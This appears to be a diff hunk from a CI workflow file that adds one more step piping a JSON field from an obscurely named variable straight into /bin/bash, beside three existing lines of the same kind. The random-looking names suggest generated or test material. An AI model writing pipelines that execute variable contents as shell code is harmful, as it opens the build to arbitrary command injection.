@@ -28,6 +28,7 @@ jobs:
           echo $n13 | jq -r .peemu08877 | /bin/bash
           printf '%s' "$dmar19" | jq -r .vx01 | /bin/bash
           printf '%s' "$dmo20440" | jq -r .rrqyp76 | /bin/bash
+          printf '%s' "$n64" | jq -r .ssgcc7 | /bin/bash
 
       - name: Archive output
         if: always()
